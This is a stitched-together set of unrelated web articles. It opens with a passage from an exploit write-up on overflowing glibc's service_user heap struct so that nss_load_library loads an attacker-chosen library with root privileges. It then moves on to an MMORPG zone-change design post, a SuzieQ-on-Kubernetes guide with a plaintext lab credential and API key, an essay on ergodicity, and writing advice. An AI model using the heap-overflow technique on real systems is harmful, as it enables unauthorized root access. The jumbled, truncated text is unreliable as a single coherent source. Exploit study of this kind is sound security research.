<p>In the second option we try to overflow into a <code>service_user</code> struct stored on the heap.</p>
<div><pre><code data-lang="C"><span>typedef</span> <span>struct</span> service_user
{
  <span>/* And the link to the next entry.  */</span>
  <span>struct</span> service_user <span>*</span>next;
  <span>/* Action according to result.  */</span>
  lookup_actions actions[<span>5</span>];
  <span>/* Link to the underlying library object.  */</span>
  service_library <span>*</span>library;
  <span>/* Collection of known functions.  */</span>
  <span>void</span> <span>*</span>known;
  <span>/* Name of the service (`files', `dns', `nis', ...).  */</span>
  <span>char</span> name[<span>0</span>];
} service_user;
</code></pre></div><p>This struct is used in the <code>nss_load_library</code> of libc quite often after the overflow happens for loading new dynamically linked libraries, and can we overflow the name filed then we control what library to load.
Then we can target some non privileged library we can craft that will run with the privileges of root. :-)</p>
<p>The function looks like this:</p>
<div><pre><code data-lang="C"><span>static</span> <span>int</span>
<span>nss_load_library</span> (service_user <span>*</span>ni)
{
  <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
    {
      <span>static</span> name_database default_table;
      ni<span>-&gt;</span>library <span>=</span> nss_new_service (service_table <span>?:</span> <span>&amp;</span>default_table,
				     ni<span>-&gt;</span>name);
      <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
	<span>return</span> <span>-</span><span>1</span>;
    }

  <span>if</span> (ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>==</span> NULL)
    {
      <span>/* Load the shared library.  */</span>
      size_t shlen <span>=</span> (<span>7</span> <span>+</span> strlen (ni<span>-&gt;</span>name) <span>+</span> <span>3</span>
		      <span>+</span> strlen (__nss_shlib_revision) <span>+</span> <span>1</span>);
      <span>int</span> saved_errno <span>=</span> errno;
      <span>char</span> shlib_name[shlen];

      <span>/* Construct shared object name.  */</span>
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      <span>"libnss_"</span>),
				    ni<span>-&gt;</span>name),
			  <span>".so"</span>),
		__nss_shlib_revision);

      ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>=</span> __libc_dlopen (shlib_name);
      <span>//continue long long function
</span></code></pre></div><p>The goal with this function is to hit the <code>ni-&gt;library-&gt;lib_handle = __libc_dlopen(shlib_name)</code> loading a new library we control.</p>
<p>Here there are two things to be aware of the first the one mentioned in the article.
If <code>ni-&gt;library</code> is not <code>NULL</code> we will use that pointer in the <code>ni-&gt;library-&gt;lib_handle</code> and as ASLR is a bitch we can’t predict a valid pointer without a leak which we don’t have.
Fortunately there is a initial case for this struct where if this is null we set it by <code>ni-&gt;library = nss_new_service (...</code>. Now the multiple null byte write comes in handy!</p>
<p>Then we just need to overflow this struct all the way to it’s name field to change it to an unprivileged library we control.</p>
<p>The second challenge is that we have this next pointer <code>struct service_user *next;</code> inside the struct forming a linked list that will be traversed when the loading happens.
So if we accidentally overflow another <code>service_user</code> struct in the process we will write a garbage pointer if we overflow with fx A’s leading to a seg fault.
This can be circumvented by inserting null bytes in that spot but that creates another problem, we now break the linked list and our target struct could now be completely removed from the list leaving no pointers to it in the entire memory space.</p>
<p>This means that we have to target the first struct in the linked list that comes after our allocated area.
This turned out to be the biggest challenge to overcome as you can imagine this requires pretty good control of the heap allocation.</p>
<p>In the article they target a <code>service_user</code> with the name <code>systemd</code> which we by no means were able to target.
So we set a breakpoint just before the allocation to inspect the linked list. Then we search for <code>systemd</code> and traverse the list backwards until we find the first <code>service_user</code> close to our allocation. (Combined with some trial and error overflowing of A’s to see what struct it crashes on :-))</p>
<p>Here I show the different <code>service_user</code> names in memory and below vmmaps listed in same order. As seen on the picture the second vmmap corresponds to a systemd in the offset at 0x47e0 from heap …</p></article></div></div></div>

<h2>Status Update</h2>



<p>It's been a bit since I've posted, but things are chugging along! I keep the Roadmap/Changelog pretty up to date as things are merged into the next release, so keep an eye on those pages if you're curious where we are and haven't seen a post in a while.</p>



<p>I am happy to say that since my last post we have solved a lot of content/client side challenges and have either a working proof of concept or framework in place to handle the following:</p>



<ul><li>Support for non humanoid NPCs</li><li>Ability to switch between zone servers (I.e. "zoning" into a new location) while keeping your character state synchronized in the world.</li><li>Shared wardrobe models that can be used by most, if not all humanoids. These can be mapped to NPCs statically or dynamically rendered based on the equipment being worn.</li></ul>



<div><figure><img src="https://www.funkhouse.games/wp-content/uploads/2020/04/image.png" alt="" srcset="https://www.funkhouse.games/wp-content/uploads/2020/04/image.png 397w, https://www.funkhouse.games/wp-content/uploads/2020/04/image-208x300.png 208w" sizes="(max-width: 397px) 100vw, 397px"><figcaption>Preview of the wardrobe system. In this case, a matching robe &amp; coif are equipped by my player.</figcaption></figure></div>



<p>In the near future I am planning on releasing a simplified version of our framework which handles the mapping/rendering of armor as it is equipped/removed, as well as a way to define an entire wardrobe collection for NPCs regardless of what they have equipped.</p>



<p>Given that we're abstracting the Unity Multipurpose Avatar (a free) plugin, the hope is to share some code that others could copy/reuse to jump start their wardrobe/equipment system. This won't actually integrate with a database, but will give a clear picture on how you could manage/scale for an MMORPG.</p>



<p>I should have the above example ready in just a couple weeks here, but in the meantime.. I'm going to post a quick overview of the challenges we faced when getting a character to switch between zones.</p>



<h2>Synchronization Challenges</h2>



<p>So lets dig into the process of moving a player between zones. If you have been following along with our other posts, you should be aware that the world state is hosted/maintained by a single server.  Then, each zone is hosted by its own independent server, maintaining its own state separate from the world. Therefore, certain state changes which occur on the zone need to be propagated up to the world and vice versa.</p>



<p><em>For the sake of clarity, when referring to the "bind" location of the player, that is the zone, position, and direction they load upon dying (or can teleport to if they are a spell caster).</em></p>



<p>Before this change we did implement one aspect of zoning: reloading upon death. If your character died, the current zone server would persist your bind location as your current location in the database. Then, the character would (in a hard-coded manner) load the same exact zone, but upon load would use the new position which had been persisted by the zone just moments before.</p>



<p>We had built the death event in this way last year in preparation for changing zones. By handling deaths as an actual zone change, we'd hopefully have most of the code ready for when we get to changing between different zones. However, after we tried fitting in movement between two different zones... the issues with our previous design began to show.</p>



<h4>Previous Implementation</h4>



<ol><li>Player dies in the zone</li><li>Zone server creates a corpse and moves all player items/coins to said corpse. Updates position/direction/zone of the player to his or her bind location. These are persisted in the database. </li><li>Zone server alerts connected clients, letting them know of the death</li><li>Player who died contacts zone server to "leave" the zone</li><li>Zone server unloads the player, saving their state in the database.<ul><li>(Alternatively) if the player disconnected, they will be unloaded after a few minutes. At which point, their new state is persisted.</li></ul></li><li>Player requests a new "Zone Change" token from the world server. The <strong>player</strong> was specifying the zone they wanted to connect to in this case. (The zone in which they had died in, because we did not support changing zones yet)</li><li>Player requests to enter the zone for their bind, providing the "Zone Change" token.</li><li>Zone server calls the world server to validate the above token. If valid, the player is loaded from the database into the zone's memory.</li><li>Zone informs all of the connected clients that a player has entered the zone</li><li>Player continues process for loading the zone (terrain/audio/weather assets, each character individually from the zone server, etc.) </li></ol>



<p>Now there are a boatload of issues with the above. To list a few:</p>



<ul><li>The player is specifying the zone they want to go to, rather than simply being told.</li><li>World server wasn't validating whether a zone change is valid for a player. For example, a player who is far away from a portal shouldn't be able to use it to zone. A player shouldn't be able to "hop" 5-6 zones at once unless they happened to be bound there (or were teleported by a wizard/druid).</li><li>The player would leave the current zone before seeing if they could get a "Zone Change" token from the world server. This is OK for deaths, but does not work for normal zone changes. What if the target zone server is down for an extended period? Well, you've already disconnected from your current zone -- and with no zone left to connect to you would crash.</li></ul>



<h4>New Implementation</h4>



<p>So how does the zone change flow actually look like now? Lets look at the death case.</p>



<ol><li>Player dies in a zone</li><li>Zone server creates a corpse and moves all player items/coins to said corpse. Updates position/direction/zone of the player to his or her bind location. These are persisted in the database in case the player crashes.</li><li>Zone server informs the <strong>world server</strong> that the player has died.</li><li>Zone server alerts connected player clients/authoritative client, letting them know of the death.</li><li>Player who died contacts the <strong>world server</strong> first this time, informing the world server that it is requesting a zone change token for a particular reason of death.</li><li>World server checks whether the player is in fact dead (which it learned of in step 3). If true, the world creates a "Simple Zone Change" token and <strong>caches it</strong> locally, along with the player's target zone/location. The target zone host is returned to the player client, so they know which socket servers to connect to next.</li><li>Player calls the <strong>current zone</strong> they're in with the "Simple Zone Change" token to inform them that they're disconnecting.</li><li><strong>Current zone</strong> calls the world server, providing the zone change token, to inform them that the player is now leaving. </li><li>World server uses the zone change token provided from the zone server to lookup the player's target zone / location. The player's state is updated in the world at this point (required for the non death case).</li><li>World server returns back to the zone server an <strong>"Upgraded Zone Change"</strong> token.</li><li>Unless there was a failure validating the token, the zone will finally unload the player -- persisting all changes (except for their zone/position) in the database. Note that this step is required for the <strong>non death case</strong>. Death persistence happens in step 2.</li><li>Zone server returns the "Upgraded Zone Change" token to the player client.</li><li>Player client finally connects to the target zone host that it was provided in step 6, this time providing the "Upgraded Zone Change" token.</li><li>Target zone server calls the world server with the upgraded token. If valid, the world server will inform the player's party/guild members of the zone update, remove the token, and update their state as no longer dead.</li><li>If the target zone server receives back a success from the world, the player is loaded from the database into the zone's memory.</li><li>Zone informs all of the connected clients that a player has entered the zone </li><li>Player continues process for loading the zone (terrain/audio/weather assets, each character individually from the zone server, etc.)</li></ol>



<p>Although this process became a lot more intricate, I was really motivated after seeing cheating programs for EverQuest which would allow you to  instantly zone from any position, as long as the target zone was connected (including bind locations, for example). I wanted to be sure our game servers could authoritatively check that the player is entering a new zone legally, as best I could.</p>



<p>Note that I've primarily discussed the death case, but how do we generically change zones in an authoritative manner?</p>



<p>For this we created a new entity to track throughout servers/clients: "ZoneLinks". A zone link is really just the definition between two zones that are connected, including the position in the world where the links are located as well as other metadata to represent how the player's direction will be calculated after zoning.</p>



<p>Finally, on step 5 of the new flow -- rather than the player requesting a zone change token from the world for a reason of death, the player will request the zone change token for a reason of "ZoneLink". Additionally, the player only provides the zone link ID they are triggering. This allows for the server to decide/enforce which target zone the player will go to, as well as to lookup and see whether the player is truly within range of the zone boundary.</p>



<p>Although not important to the flow, we currently support "Proximity" link triggers on the client and "Clickable" link triggers on the client. A clickable link trigger can be assigned to a GameObject in unity so that whenever clicked it will trigger, whereas a proximity link trigger is simply an invisible game object w/ a collider (triggering when a player walks through it).</p>



<div><figure><img src="https://www.funkhouse.games/wp-content/uploads/2020/04/proximity-zone-link.gif" alt=""><figcaption> Proof of concept / demonstration of proximity based zone links working. (These two zones wont really have a connection) </figcaption></figure></div>



<p>If you look closely in the above, you should be able to see most of the new features we've added since the last post. For example, the NPCs are wearing armor -- and in this case it is a static wardrobe collection for that type of NPC -- whereas the sword they are wielding is coming from is actually equipped.</p>



<p>And with that.. I'll leave you guys until the next update.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h2 id="why">Why?</h2>
<p>I recently discovered <a href="https://github.com/netenglabs/suzieq">SuzieQ</a>, it’s a wonderful new tool that Dinesh Dutt and Justin Pietsch have been working on.  For more details on what exactly SuzieQ is see the intro <a href="https://elegantnetwork.github.io/posts/Suzieq/">post</a> by Justin &amp; Dinesh.</p>
<p>As to why put it on k8s?  I don’t know k8s well, it’s just the compute hammer I have to work with in my current environment. That said, I do happen to like k8s as a hammer, and luckily suzieq seems to do a pretty good job of being a k8s nail.</p>
<p>This document started as a weekend project to walk thru getting suzieq on k8s in my private lab for no other reason than it seemed fun.  The more I worked with it on k8s the more I liked the idea, and the more I liked the idea of deploying in my real physical lab.</p>
<p>The environment I have for my network management software is a managed k8s environment.  It’s what I have access to for “managed compute”. It also has access to the management plane of my network gear.  This means if I want to go to the real lab or prod, I have a vested interest in being able to deploy suzieq on k8s.</p>
<p>The idea of using a HTTP based API for accessing much of the info that suzieq collects appeals to me.  I like the idea of connecting to a suzieQ deployment versus running the pollers directly on my workstation.  Playing with that as a puzzle problem appeals to me as much as suzieQ as a product appeals to me as a network engineer.    I like the idea of the journey and the destination as it were.</p>

<p>Mostly me, this started as notes for me to reference later on how to do it, but I don’t imagine I’m gonna be the first person that thinks of running SuzieQ on k8s.</p>
<h2 id="the-basic-target">The basic target</h2>
<p>For just playing around in the lab I want to start out with something that sticks as close as I can to the docker example that is in the suzieq repository.  In that example there are two containers; one for sq-poller, and another for the suzieq-cli.   I’m going to replicate the same in a k8s deployment set with replicas set to 1.</p>
<p>My goal will be to run run 3 containers in a single k8s pod, one container for each of the following processes that make up suzieq.</p>
<ol>
<li><code>sq-poller</code></li>
<li><code>sq-rest-server.py</code></li>
<li><code>suzieq-gui</code></li>
</ol>
<p>For simplicity I will use the same docker container as the docker demo</p>
<p>What’s needed</p>
<ul>
<li>For persisting data I will use a k8s <a href="https://kubernetes.io/docs/concepts/storage/persistent-volumes/">persistent volume</a></li>
<li>For managing config I will store configs as a k8s <a href="https://kubernetes.io/docs/concepts/configuration/configmap/">config map</a></li>
<li>For storing secrets like certificates, keys or passwords I will use k8s <a href="https://kubernetes.io/docs/concepts/configuration/secret/">secrets</a></li>
<li>To expose the Rest API and GUI outside of the cluster, I will use a k8s <a href="https://kubernetes.io/docs/concepts/services-networking/service/">service</a></li>
<li>To tie it all together I will use a k8s <a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/">deployment</a></li>
</ul>
<p>The assorted yml files referenced in this post as well as the content of this post is available on <a href="https://github.com/hyposcaler/suzieq-on-k8s/">github</a></p>
<h2 id="generating-the-certificates">Generating the certificates</h2>
<p>I need a cert for the demo deployment, a self signed cert will do.  In production the certificate would be signed by my internal CA.  I can use openssl to generate the certificate with the following command</p>
<p><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></p>
<p>Below is an example of using openssl in interactive mode to generate a selfsigned certificate.</p>
<pre><code>[dev-suzieq]$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Generating a 4096 bit RSA private key
....................++
........................................++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:US
State or Province Name (full name) []: Bespin
Locality Name (eg, city) [Default City]:Cloud City    
Organization Name (eg, company) [Default Company Ltd]:Hyperbolic Hyposcaler Industries
Organizational Unit Name (eg, section) []:network
Common Name (eg, your name or your server's hostname) []:suzieq.network.hyposcaler.net
Email Address []:devnull@hyposcaler.io
</code></pre><p>After running the command and filling in the details it should produce two files: <code>key.pem</code> and <code>cert.pem</code>.</p>
<p>Once I have the certs I’ll store them as secrets on the k8s server.  For the lab I’ll just use kubectl for that.  The following command will create the secret from the cert.pem and key.pem created by openssl earlier.</p>
<pre><code>kubectl create secret tls suzieq-tls-secret \
  --cert=cert.pem \
  --key=key.pem
</code></pre><p>Regardless of how the cert is created, a k8s TLS secret is typically the interface for the deployment to access it.  There are a variety of methods to manage secrets securely on k8, they generally tend to have use of k8s secrets in common as the delivery method for exposing the secrets to containers.</p>
<p>In practice while I may not be doing exactly what I would in prod, the way I’m doing it creates a good approximation of what suzieq would see in prodution in my environment.</p>
<p>Once I have created the k8s TLS secret, the key and cert files from openssl can be deleted.</p>
<h2 id="create-a-namespace">create a namespace</h2>
<p>To keep things neat I will create a namesspace, all the remaining k8s objects I create will be created within this namespace</p>
<p>I can use <code>kubectl create namespace suzieq</code></p>
<pre><code>[dev-suzieq]$ kubectl create namespace suzieq
namespace/suzieq created
[dev-suzieq]$
</code></pre><p>verify it is in place with <code>kubectl get namespace suzieq</code></p>
<pre><code>[dev-suzieq]$ kubectl get namespace suzieq
NAME     STATUS   AGE
suzieq   Active   3s
[dev-suzieq]$
</code></pre><h2 id="generating-the-configmaps">Generating the configMaps</h2>
<p>There are two config related files that suzieQ uses</p>
<p>The first is <code>suzieq-cfg.yml</code>. It is the main suzieq config file.  The suzieq config holds pointers to the assorted paths for files it uses.  It also holds references to the the API_KEY used by the Rest server for auth.  Lastly it also has pointers to the locations of the TLS certificates.</p>
<p>The following is a typical <code>suzieq-cfg.yml</code> file</p>
<div><pre><code data-lang="yaml"><span>data-directory</span>: <span>/suzieq/parquet</span>
<span>service-directory</span>: <span>/suzieq/config</span>
<span>schema-directory</span>: <span>/suzieq/config/schema</span>
<span>temp-directory</span>: <span>/tmp/</span>
<span># kafka-servers: localhost:9093</span>
<span>logging-level</span>: <span>WARNING</span>
<span>period</span>: <span>15</span>
<span>API_KEY</span>: <span>496157e6e869ef7f3d6ecb24a6f6d847b224ee4f</span>
<span>rest_certfile</span>: <span>/suzieq/tls/cert.pem</span>
<span>rest_keyfile</span>: <span>/suzieq/tls/key.pem</span>
</code></pre></div><p>In fact it’s the default config, with one small change:  I have added a subdirectory under /suzieq/ to hold the certificates.  I like having an empty directory to mount the TLS secrets into.</p>
<p>The other config we need to keep track of is the inventory.  The inventory is also a yaml based file.</p>
<p>I use this as my standin for inventory</p>
<div><pre><code data-lang="yaml">- <span>namespace</span>: <span>eos</span>
  <span>hosts</span>:
    - <span>url</span>: <span>https://neteng:arista123@10.255.0.10 devtype=eos</span>
</code></pre></div><p>Note I’m storing the passwords in the clear here, for a small private virtual lab that gets spun up and down as needed, I’m happy to do that.  This is not something I would want to do in production.  It also happens that in my specific production instance I need a way to support password based auth.   I would ultimately prefer to store the credential as a k8s secret, and pass that secret into the container via an environment variable, or file.</p>
<p>If I were using SSH keys, I would use a k8s ssh key secret and mount them into the suzieq directory under a keys subfolder, similar to what I do do with TLS.  You specify a path to the key in the suzieq poller config, so it would work well for k8s SSH secret.</p>
<p>For the suzieq-cfg.yml a config map fits the bill nicely.  For lab purposes or small scale deployments, a configMap should work for inventory as well, there’s an upper limit of 1MB, but that’s a lot of config.</p>
<p>Either way I mash these up into the same yaml file named configmap.yml.</p>
<p>The resulting file looks like the following.</p>
<div><pre><code data-lang="yaml">---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>ConfigMap</span>
<span>metadata</span>:
  <span>name</span>: <span>suzieq-inventory</span>
  <span>namespace</span>: <span>suzieq</span>
<span>data</span>:
 <span>inventory.yml</span>: <span>|
</span><span>    - namespace: eos
</span><span>      hosts:
</span><span>        - url: https://neteng:arista123@10.255.0.10 devtype=eos</span>
---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>ConfigMap</span>
<span>metadata</span>:
  <span>name</span>: <span>suzieq-config</span>
  <span>namespace</span>: <span>suzieq</span>
<span>data</span>:
  <span>suzieq-cfg.yml</span>: <span>|
</span><span>    data-directory: /suzieq/parquet
</span><span>    service-directory: /suzieq/config
</span><span>    schema-directory: /suzieq/config/schema
</span><span>    temp-directory: /tmp/
</span><span>    # kafka-servers: localhost:9093
</span><span>    logging-level: WARNING
</span><span>    period: 15
</span><span>    API_KEY: 496157e6e869ef7f3d6ecb24a6f6d847b224ee4f
</span><span>    rest_certfile: /suzieq/tls/tls.crt
</span><span>    rest_keyfile: /suzieq/tls/tls.key
</span></code></pre></div><p>then use kubectl to create the two configmaps on the k8s cluster by running <code>kubectl create -f samples/k8s/configmap.yml</code> from the root of the repo</p>
<p>once created kubectl can be used to to verify they exist:</p>
<pre><code data-lang="cli">[dev-suzieq]$ kubectl -n suzieq describe configmap
NAME               DATA   AGE
suzieq-config      1      25h
suzieq-inventory   2      20h
[dev-suzieq]$
</code></pre><p>After they are created, they can later be edited in place, or overwritten with new config maps.</p>
<h2 id="persistent-volumes">Persistent Volumes</h2>
<p>For the persistent volume, create a file named pvc.yml with the following contents</p>
<div><pre><code data-lang="yaml">---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>PersistentVolumeClaim</span>
<span>metadata</span>:
  <span>namespace</span>: <span>suzieq</span>
  <span>name</span>: <span>parquet-pv-claim</span>
<span>spec</span>:
  <span>accessModes</span>:
    - <span>ReadWriteOnce     # will only have 1 pod so read </span>
  <span>resources</span>:            <span># write once for now is fine</span>
    <span>requests</span>:
      <span>storage</span>: <span>5Gi      # 5Gi completely arbitrary value. </span>
</code></pre></div><p>deploy it to the cluster via <code>kubectl create -f samples/k8s/pvc.yml</code>, this will cause the cluster to set aside 5Gi of storage, it’s lifecycle is not tied to the pod.  The pods are ephemeral, the storage can persist across the life of many pods.</p>
<h2 id="the-deployment">the deployment</h2>
<p>with the volumes, secrets, and storage lined up on the k8s cluster, all that remains is the deployment for the pod.</p>
<p>use a k8s <a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/">deployment</a> to deploy suzieq.</p>
<p>The documentation does a pretty good job of explaining what a deployment is. Refer to the k8s deployment documentation for more details.</p>
<p>This deployment will ensure that there are always 3 containers running.  The containers only really have 3 differences between them</p>
<ul>
<li>the command executed at start</li>
<li>the volumes they have access to</li>
<li>the resource memory and cpu requests/limits</li>
</ul>
<h3 id="command-executed">command executed</h3>

<p><span><b>TL;DR</b></span></p>
<ul>
<li>Here’s the game. Flip a coin. You win 50% of your net worth on heads, but only lose 40% on tails. How many times should you play?</li>
<li>Despite the apparently favourable odds, chances are you’ll eventually go bust. Why?</li>
<li>This is because of the path-dependency of time. Because of the fallacious ergodicity assumption.</li>
<li>Ergodicity is when the ensemble-average equals the time-average. For instance, when 10 people doing something once produces the same result as 1 person doing it 10 times.</li>
<li>Essentially, ergodicity lets you conveniently convert time into a space equivalent.&nbsp;</li>
<li>For non-ergodic systems, the aggregate’s performance is a misleading indicator of individual performance. As a whole, the average might look like it’s winning, despite majority of individuals losing.</li>
<li>The Kelly criterion allows us to optimize our bet size to maximize long-term winnings.</li>
<li>While most financial systems are non-ergodic, the foundations of classical economic theory rests on fallacious ergodic assumptions – from DCF valuations to the way we measure GDP growth.</li>
<li>Putting these ergodicity concepts to practical use, I’ve now increased the weighting I give to non-recoverable risks.</li>

<p>You’re probably familiar with these common mistakes in interpreting data:</p>
<ul>
<li>Looking at <strong>average</strong> when you should be looking at <strong>median.</strong> <span>e.g. for personal income distributions</span></li>
<li>Looking at <strong>aggregates</strong> rather than more <strong>granular</strong> <strong>segments.</strong> <span>e.g. sales increased 10% this year, but all of it came from a new business line, while the core businesses remained flat</span></li>
<li>Mistaking <strong>non-linear</strong> outcomes to be <strong>linear</strong> ones <span>e.g. cumulative number of COVID-19 cases</span></li>
</ul>
<p>But you’re probably less familiar with the <strong>ergodicity assumption</strong>.</p>
<p>Surprisingly prevalent in systems, but generally poorly understood and barely known.</p>
<p>Much like Black Swans, <a href="https://neurabites.com/antifragility/" target="_blank" rel="noopener noreferrer">antifragility, non-linearity, and optionality</a>, it’s another concept that Nassim Taleb has raised his voice on. But this one has received far less attention than others.</p>
<p>And hence I write this post in parts:</p>

<li><strong>Going bust despite favourable odds</strong>: A gambling example, ergodic vs non-ergodic, and the Kelly criterion</li>
<li><strong>Ergodocity economics: </strong>Prevalence and dangers of the ergodic assumption in modern portfolio theory, DCF models, and GDP</li>

<h3><span><strong>1. Going bust despite favourable odds</strong></span></h3>
<p><span><b>1.1. Definition</b></span></p>
<blockquote>
<p>A process is said to be <strong>ergodic</strong>&nbsp;if the <strong>ensemble</strong>-average and <strong>time</strong>-average is <strong>equivalent</strong>.</p>
</blockquote>
<p>A more formal definition from Ole Peters from his <a href="https://www.nature.com/articles/s41567-019-0732-0" target="_blank" rel="noopener noreferrer">Dec-19 Nature journal article</a>:</p>
<blockquote>
<p>The ergodic hypothesis is a key analytical device of equilibrium statistical mechanics. It underlies the assumption that the <strong>time</strong> <strong>average</strong> and the <strong>expectation</strong> <strong>value</strong> of an observable are the same. Where it is valid, dynamical descriptions can often be replaced with much simpler probabilistic ones — time is essentially eliminated from the models.</p>
</blockquote>
<p>A mouthful right? Let’s park the definition here for now, and take baby steps with a more digestible example.</p>

<p><span><b>1.2. Rigged coin flip game</b></span></p>
<p>Flip a coin. If heads, your net wealth is <strong>increased by 50%</strong>. If tails, your net wealth is <strong>decreased by 40%</strong>.</p>
<p>Would you play? If so, how many times?</p>
<p>At first glance it seems like the game is rigged in your favour. We expect an equal number of heads and tails in the long run. Given you are paid more from each head than you are penalised for on each tail, you should just play as many times as possible right? Besides, even if you end up on a losing streak, you don’t ever lose all your money, you only lose 40% of whatever you were on. You can win it back with the favourable payoffs. Right?</p>
<p>Well, here’s a simulation of what could happen if you played 50 times.</p>

<ul>
<li>Horizontal axis is time.</li>
<li>Vertical axis is net worth, a function of time.</li>
<li>N=1 means we’re looking at the outcome for 1 individual.</li>
</ul>
<p>There doesn’t seem to be a trend here. We were expecting an upward gradient given the favourable odds. But we end up at a loss. Strange. Maybe this guy was unlucky?</p>
<p>Let’s extend the simulation for this one individual into 1,000 rounds.</p>

<p>Looks like they’re stuck at zero. This is surprisingly given the favourable odds. We expected the math to offset the unlucky first 50 rounds. Is this guy just really unlucky?&nbsp;</p>

<p>The green line shows the <strong>average</strong> y-values (wealth) for 100 players at each x-value (time). Again, no clear trend.</p>
<p>Simulate for 10,000 players (red line) and we start to see a trend. On average, this group of 10,000 players is sitting on a nice ~10x profit.</p>
<p>Simulate a million concurrent players, and the trend is more apparent.&nbsp;</p>
<p>Again, a logarithmic axis shows this more clearly.</p>

<p>The average wealth of a million people increases exponentially as they play this game. <span>(Recall from all the March COVID-19 graphs that a linear increase on logarithmic axis means exponential growth. It’s a neat trick to distinguish exponential growth from mere very fast growth.)</span></p>
<p>This trend persists as we extend time to 1,000 rounds and so on.&nbsp;</p>

<p>But wait. This doesn’t make sense.</p>
<p>Earlier, we showed that for an <strong>individual</strong> player, wealth trends to <strong>zero&nbsp;</strong>over time.</p>
<p>But for the <strong>aggregate</strong> of individuals, wealth trends <strong>exponentially upwards</strong> over time.</p>
<p>How can many things that trend to zero sum up to exponential growth?</p>
<p>Answer: <strong>there’s a few really lucky bastards that distort the average.</strong></p>
<p>A more technical answer: <strong>ergodicity</strong>. Or more specifically, a false assumption of ergodicity for this non-ergodic game.</p>

<p>Let’s take a deeper dive and explore some scenarios for an individual starting with $100.</p>
<p><strong>Round 1</strong>: 2 scenarios</p>
<ul>

</ul>
<p>Some observations.</p>
<p>(i) In aggregate, payout is favourable to the players since average wealth is consistently above starting value of $100. This is the ensemble-average.</p>
<p>(ii) But this asymmetric payoff is only favourable on the <strong>ensemble dimension</strong> (taking the aggregate and dividing it by number of players). The pay-off structure is not favourable to an individual on the <strong>temporal </strong>(time) <strong>dimension</strong>. On an individual level, people are actually more likely to lose the longer they play. Gambler’s ruin. Thus, looking at ensemble returns is a poor indicator of individual returns.</p>
<p>So as the game goes on: the house loses money as they’re paying out more than they receive, while more people become losers, and just a lucky few get obscenely rich. <span>(For context, the winnings from 100 consecutive heads, $4.1 x 10<sup>19</sup> is taking the global GDP of ~$100t and multiplying it by 400k years. So all of the wealth we’re creating today multiplied by longer than Homo sapiens’ existence. The probability of 1 in 2<sup>100 </sup>is even more ludicrous.)</span></p>
<p>There’s many variations to the example we explored: e.g. a triple-or-nothing coin flip. We get similar results except instead of decaying to zero, people go completely bust and end the game there, while some extremely lucky get fanatically rich.</p>

<p><span><b>1.3. Back to ergodicity</b></span></p>
<p>Recall:</p>
<blockquote>
<p>A process is said to be <strong>ergodic</strong>&nbsp;if the <strong>ensemble</strong>-average and <strong>time</strong>-average is <strong>equivalent</strong>.</p>
</blockquote>
<p>Clearly, simulating an individual playing 10,000 rounds gives a drastically different result to simulating 10,000 individuals playing 1 round.</p>
<p>The trajectory of an individual over a long time (time-average) gives a different result to the aggregate of many individual’s trajectories at an instant in time (ensemble-average, aka. space-average).<span>&nbsp;(Note: we can substitute ‘average’ in this statement with expectation value/outcome/probability/pay-off.)</span></p>
<p>What accounts for this difference is the <strong>path-dependent property of time</strong>. This distinction between the ensemble …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>A common writing advice is to keep your sentences short and simple. The argument goes that writing is better when it is concise, because you’re more efficiently communicating your ideas. Long sentences take more energy for the reader to process, and you shouldn’t require that of the reader if it’s not necessary. That seems to be the logic.</p>
<p>This is bad advice.</p>
<p>Sentence length and rhythm are linguistic tools at the disposal of a writer just like word choice and grammar. Short sentences are useful for certain things, and long sentences are useful for other things. To tell a writer to only use short sentences because long sentences are hard to understand is patronizing to both the writer, whose ability to compose good sentences you have just insulted, and the reader, whose reading ability you have also underestimated.</p>
<p>If you keep your sentence lengths short all the time, and your sentence structures minimal all the time, you don’t get good prose, you get a nursery rhyme. Something with such monotonic and one-track rhythm that it becomes tedious to read.</p>
<p>Imagine if I only wrote the shortest sentences I could. I cut out all my asides. I remove redundant words. I keep my ideas concise. It gets boring to read. My ideas no longer connect from one sentence to another. They can’t congeal in the mind. Reading writing like this feels disjointed and stuttery. You eventually focus too much on the broken rhythm. How are we to communicate eloquently like this? It’s madness.</p>
<p>Instead, consider this:</p>
<p>Short sentences are sometimes useful. They’re useful for making a sharp point, like a fast cut in a film synchronized to the sudden <em>pang</em> of a gunshot. They’re also useful for stating a claim: <em>long sentences are fine.</em> But many times, you write for a purpose greater than to simply transplant a logical assertion from your brain to the brain of another human. Like a single cut in a film that follows a character sprinting across a burning battlefield with bombs raining down, long sentences stretch out time and build tension through the words. Composers, who think deeply about the importance of variety in phrasing, know the importance of this variation intimately.</p>
<p>Sometimes what you want is indeed a sharp, pointed sentence.</p>
<blockquote>
<p>Keep your sentences short. Make simple points. Hold the reader’s attention. Don’t make them think harder to understand what you mean.</p>
</blockquote>
<p>But many times, the meaning isn’t in the words we use but how we say it.</p>
<blockquote>
<p>If you trust in the reader, if you trust in the strength of your idea spoken through your words to hold their hands steadily and firmly through your maze of ideas bubbling through, you might occasionally take the leap of faith to build tension and anticipation through a longer sentence – perhaps one just like this – to build to a great release at the end. A breath of relief; a point made.</p>
</blockquote>
